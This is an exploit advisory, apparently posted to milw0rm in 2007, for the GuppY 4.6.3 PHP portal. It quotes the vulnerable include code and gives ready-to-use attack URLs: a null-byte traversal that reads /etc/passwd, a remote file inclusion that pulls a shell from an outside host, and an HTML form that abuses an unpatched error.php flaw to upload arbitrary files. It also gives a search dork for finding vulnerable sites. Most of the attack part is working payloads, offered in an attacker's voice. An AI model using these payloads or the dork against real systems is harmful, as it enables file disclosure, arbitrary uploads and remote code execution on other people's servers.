<html><head><title>GuppY 4.6.3 (includes.inc selskin) Remote File Inclusion Vulnerability</title></head><pre>vuln.: GuppY 4.6.3 (includes.inc selskin) Remote File Inclusion
  script info and download: http://www.freeguppy.org/
  dork: &quot;Site powered by GuppY&quot; 
 
  author: irk4z[at]yahoo.pl
  greets to: str0ke, rgod, polish under :*
'-----------------------------------------------------------------------------' 
 
# code:

   /tinymsg.php, line 24:
   ...
24    define(&quot;CHEMIN&quot;, &quot;&quot;);
   ...   
   
   /inc/includes.inc, lines 155-168:
   ...
155   if (isset($selskin)) {
156     $page[14]=$selskin;
157   }
158
159   if (is_file(CHEMIN.&quot;skin/&quot;.$page[14].&quot;/skin&quot;.INCEXT)) {
160    include(CHEMIN.&quot;skin/&quot;.$page[14].&quot;/skin&quot;.INCEXT);
161   } else {
162    include(CHEMIN.&quot;skin/no_skin/skin&quot;.INCEXT);
163   }
164   if (is_file(CHEMIN.&quot;skin/&quot;.$page[14].&quot;/confskin&quot;.INCEXT)) {
165    include(CHEMIN.&quot;skin/&quot;.$page[14].&quot;/confskin&quot;.INCEXT);
166   } else {
167    include(CHEMIN.&quot;skin/no_skin/confskin&quot;.INCEXT);
168   }
   ...
   
   Local file inclusion on line 160 in $selskin, and I have used code
   from:
   
   /inc/boxleft.inc, lines 98-102:
   
   ...
98    for($ii=0; $ii&lt;count($xposbox[&quot;L&quot;]); $ii++) {
99      if ($userprefs[3] != &quot;R&quot; &amp;&amp; $xposbox[&quot;L&quot;][$ii] != '') {
100      include(CHEMIN.$xposbox[&quot;L&quot;][$ii].INCEXT);
101      $onemenu = 1;
102   }
   ...
   
   so.. i have remote file inclusion :D
   
# exploits:

 local file inclusion:
   http://[HOST]/[PATH]/index.php?selskin=[LFI]%00
   http://[HOST]/[PATH]/index.php?selskin=..%2F..%2F..%2F..%2F.%2Fetc%2Fpasswd%00
   
 remote file inclusion:
   http://[HOST]/[PATH]/index.php?selskin=..%2Finc%2Fboxleft.inc%00&amp;xposbox[L][]=[RFI]
   http://[HOST]/[PATH]/index.php?selskin=..%2Finc%2Fboxleft.inc%00&amp;xposbox[L][]=http:%2F%2Fhost%2Fshell?
   
   ^ xposbox[L][] and selskin must be encode because GuppY filtering query..   

# another bug: 

rgod on 2007-01-29 published local file inclusion in error.php $id variable,
but GuppY authors didn't patch it  :(  so you can upload file to

 http://[HOST]/[PATH]/file/[your uploaded file]


&lt;form name=&quot;uploadit&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;http://[HOST]/[PATH]/error.php?&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;../../admin/inc/upload&quot; alt=&quot;don't change! ;]&quot; /&gt;
&lt;input type=&quot;hidden&quot; name=&quot;pg&quot; value=&quot;upload&quot; /&gt;
&lt;input type=&quot;hidden&quot; name=&quot;rep&quot; value=&quot;file&quot; /&gt;
&lt;input type=&quot;file&quot;   name=&quot;ficup&quot; size=&quot;36&quot; /&gt;
&lt;input type=&quot;hidden&quot; name=&quot;OK&quot; value=&quot;1&quot; /&gt;
&lt;input type=&quot;submit&quot; value=&quot; ok &quot; /&gt;
&lt;/form&gt;

# milw0rm.com [2007-11-03]</pre></html>